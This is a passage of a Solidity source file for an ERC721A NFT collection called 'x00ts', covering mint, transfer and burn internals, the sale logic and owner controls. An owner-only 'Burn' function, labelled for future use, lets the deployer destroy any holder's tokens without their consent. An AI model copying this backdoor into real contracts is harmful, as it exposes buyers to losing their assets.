1082     function _mint(
1083         address to,
1084         uint256 quantity,
1085         bytes memory _data,
1086         bool safe
1087     ) internal {
1088         uint256 startTokenId = _currentIndex;
1089         if (to == address(0)) revert MintToZeroAddress();
1090         if (quantity == 0) revert MintZeroQuantity();
1091 
1092         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1093 
1094         // Overflows are incredibly unrealistic.
1095         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1096         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1097         unchecked {
1098             _addressData[to].balance += uint64(quantity);
1099             _addressData[to].numberMinted += uint64(quantity);
1100 
1101             _ownerships[startTokenId].addr = to;
1102             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1103 
1104             uint256 updatedIndex = startTokenId;
1105             uint256 end = updatedIndex + quantity;
1106 
1107             if (safe && to.isContract()) {
1108                 do {
1109                     emit Transfer(address(0), to, updatedIndex);
1110                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1111                         revert TransferToNonERC721ReceiverImplementer();
1112                     }
1113                 } while (updatedIndex != end);
1114                 // Reentrancy protection
1115                 if (_currentIndex != startTokenId) revert();
1116             } else {
1117                 do {
1118                     emit Transfer(address(0), to, updatedIndex++);
1119                 } while (updatedIndex != end);
1120             }
1121             _currentIndex = updatedIndex;
1122         }
1123         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1124     }
1125 
1126     /**
1127      * @dev Transfers `tokenId` from `from` to `to`.
1128      *
1129      * Requirements:
1130      *
1131      * - `to` cannot be the zero address.
1132      * - `tokenId` token must be owned by `from`.
1133      *
1134      * Emits a {Transfer} event.
1135      */
1136     function _transfer(
1137         address from,
1138         address to,
1139         uint256 tokenId
1140     ) private {
1141         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1142 
1143         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1144             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1145             getApproved(tokenId) == _msgSender());
1146 
1147         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1148         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1149         if (to == address(0)) revert TransferToZeroAddress();
1150 
1151         _beforeTokenTransfers(from, to, tokenId, 1);
1152 
1153         // Clear approvals from the previous owner
1154         _approve(address(0), tokenId, prevOwnership.addr);
1155 
1156         // Underflow of the sender's balance is impossible because we check for
1157         // ownership above and the recipient's balance can't realistically overflow.
1158         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1159         unchecked {
1160             _addressData[from].balance -= 1;
1161             _addressData[to].balance += 1;
1162 
1163             _ownerships[tokenId].addr = to;
1164             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1165 
1166             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1167             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1168             uint256 nextTokenId = tokenId + 1;
1169             if (_ownerships[nextTokenId].addr == address(0)) {
1170                 // This will suffice for checking _exists(nextTokenId),
1171                 // as a burned slot cannot contain the zero address.
1172                 if (nextTokenId < _currentIndex) {
1173                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1174                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1175                 }
1176             }
1177         }
1178 
1179         emit Transfer(from, to, tokenId);
1180         _afterTokenTransfers(from, to, tokenId, 1);
1181     }
1182 
1183     /**
1184      * @dev Destroys `tokenId`.
1185      * The approval is cleared when the token is burned.
1186      *
1187      * Requirements:
1188      *
1189      * - `tokenId` must exist.
1190      *
1191      * Emits a {Transfer} event.
1192      */
1193     function _burn(uint256 tokenId) internal virtual {
1194         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1195 
1196         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1197 
1198         // Clear approvals from the previous owner
1199         _approve(address(0), tokenId, prevOwnership.addr);
1200 
1201         // Underflow of the sender's balance is impossible because we check for
1202         // ownership above and the recipient's balance can't realistically overflow.
1203         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1204         unchecked {
1205             _addressData[prevOwnership.addr].balance -= 1;
1206             _addressData[prevOwnership.addr].numberBurned += 1;
1207 
1208             // Keep track of who burned the token, and the timestamp of burning.
1209             _ownerships[tokenId].addr = prevOwnership.addr;
1210             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1211             _ownerships[tokenId].burned = true;
1212 
1213             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1214             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1215             uint256 nextTokenId = tokenId + 1;
1216             if (_ownerships[nextTokenId].addr == address(0)) {
1217                 // This will suffice for checking _exists(nextTokenId),
1218                 // as a burned slot cannot contain the zero address.
1219                 if (nextTokenId < _currentIndex) {
1220                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1221                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1222                 }
1223             }
1224         }
1225 
1226         emit Transfer(prevOwnership.addr, address(0), tokenId);
1227         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1228 
1229         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1230         unchecked {
1231             _burnCounter++;
1232         }
1233     }
1234 
1235     /**
1236      * @dev Approve `to` to operate on `tokenId`
1237      *
1238      * Emits a {Approval} event.
1239      */
1240     function _approve(
1241         address to,
1242         uint256 tokenId,
1243         address owner
1244     ) private {
1245         _tokenApprovals[tokenId] = to;
1246         emit Approval(owner, to, tokenId);
1247     }
1248 
1249     /**
1250      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1251      *
1252      * @param from address representing the previous owner of the given token ID
1253      * @param to target address that will receive the tokens
1254      * @param tokenId uint256 ID of the token to be transferred
1255      * @param _data bytes optional data to send along with the call
1256      * @return bool whether the call correctly returned the expected magic value
1257      */
1258     function _checkContractOnERC721Received(
1259         address from,
1260         address to,
1261         uint256 tokenId,
1262         bytes memory _data
1263     ) private returns (bool) {
1264         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1265             return retval == IERC721Receiver(to).onERC721Received.selector;
1266         } catch (bytes memory reason) {
1267             if (reason.length == 0) {
1268                 revert TransferToNonERC721ReceiverImplementer();
1269             } else {
1270                 assembly {
1271                     revert(add(32, reason), mload(reason))
1272                 }
1273             }
1274         }
1275     }
1276 
1277     /**
1278      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1279      * And also called before burning one token.
1280      *
1281      * startTokenId - the first token id to be transferred
1282      * quantity - the amount to be transferred
1283      *
1284      * Calling conditions:
1285      *
1286      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1287      * transferred to `to`.
1288      * - When `from` is zero, `tokenId` will be minted for `to`.
1289      * - When `to` is zero, `tokenId` will be burned by `from`.
1290      * - `from` and `to` are never both zero.
1291      */
1292     function _beforeTokenTransfers(
1293         address from,
1294         address to,
1295         uint256 startTokenId,
1296         uint256 quantity
1297     ) internal virtual {}
1298 
1299     /**
1300      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1301      * minting.
1302      * And also called after one token has been burned.
1303      *
1304      * startTokenId - the first token id to be transferred
1305      * quantity - the amount to be transferred
1306      *
1307      * Calling conditions:
1308      *
1309      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1310      * transferred to `to`.
1311      * - When `from` is zero, `tokenId` has been minted for `to`.
1312      * - When `to` is zero, `tokenId` has been burned by `from`.
1313      * - `from` and `to` are never both zero.
1314      */
1315     function _afterTokenTransfers(
1316         address from,
1317         address to,
1318         uint256 startTokenId,
1319         uint256 quantity
1320     ) internal virtual {}
1321 }
1322 
1323 
1324 
1325 contract x00ts is ERC721A, Owneable {
1326 
1327     string public baseURI = "ipfs:///";
1328     string public contractURI = "ipfs://";
1329     string public baseExtension = ".json";
1330     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1331 
1332     uint256 public constant MAX_PER_TX_FREE = 1;
1333     uint256 public free_max_supply = 0;
1334     uint256 public constant MAX_PER_TX = 10;
1335     uint256 public max_supply = 5555;
1336     uint256 public price = 0.0009 ether;
1337 
1338     bool public paused = true;
1339 
1340     constructor() ERC721A("x00ts", "x00ts") {}
1341 
1342     function PublicMint(uint256 _amount) external payable {
1343         address _caller = _msgSender();
1344         require(!paused, "Paused");
1345         require(max_supply >= totalSupply() + _amount, "Exceeds max supply");
1346         require(_amount > 0, "No 0 mints");
1347         require(tx.origin == _caller, "No contracts");
1348         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1349         
1350       if(free_max_supply >= totalSupply()){
1351             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1352         }else{
1353             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1354             require(_amount * price == msg.value, "Invalid funds provided");
1355         }
1356 
1357 
1358         _safeMint(_caller, _amount);
1359     }
1360 
1361 
1362 
1363   
1364 
1365     function isApprovedForAll(address owner, address operator)
1366         override
1367         public
1368         view
1369         returns (bool)
1370     {
1371         // Whitelist OpenSea proxy contract for easy trading.
1372         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1373         if (address(proxyRegistry.proxies(owner)) == operator) {
1374             return true;
1375         }
1376 
1377         return super.isApprovedForAll(owner, operator);
1378     }
1379 
1380     function Withdraw() external onlyOwner {
1381         uint256 balance = address(this).balance;
1382         (bool success, ) = _msgSender().call{value: balance}("");
1383         require(success, "Failed to send");
1384     }
1385 
1386     function WhitelistMint(uint256 quantity) external onlyOwner {
1387         _safeMint(_msgSender(), quantity);
1388     }
1389 
1390 
1391     function pause(bool _state) external onlyOwner {
1392         paused = _state;
1393     }
1394 
1395     function setBaseURI(string memory baseURI_) external onlyOwner {
1396         baseURI = baseURI_;
1397     }
1398 
1399     function setContractURI(string memory _contractURI) external onlyOwner {
1400         contractURI = _contractURI;
1401     }
1402 
1403     function configPrice(uint256 newPrice) public onlyOwner {
1404         price = newPrice;
1405     }
1406 
1407     function configmax_supply(uint256 newSupply) public onlyOwner {
1408         max_supply = newSupply;
1409     }
1410 
1411     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1412         free_max_supply = newFreesupply;
1413     }
1414 
1415     function newbaseExtension(string memory newex) public onlyOwner {
1416         baseExtension = newex;
1417     }
1418 
1419 
1420 //Future Use
1421         function Burn(uint256[] memory tokenids) external onlyOwner {
1422         uint256 len = tokenids.length;
1423         for (uint256 i; i < len; i++) {
1424             uint256 tokenid = tokenids[i];
1425             _burn(tokenid);
1426         }
1427     }
1428 
1429 
1430     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1431         require(_exists(_tokenId), "Token does not exist.");
1432         return bytes(baseURI).length > 0 ? string(
1433             abi.encodePacked(
1434               baseURI,
1435               Strings.toString(_tokenId),
1436               baseExtension
1437             )
1438         ) : "";
1439     }
1440 }
1441 
1442 contract OwnableDelegateProxy { }
1443 contract ProxyRegistry {
1444     mapping(address => OwnableDelegateProxy) public proxies;
1445 }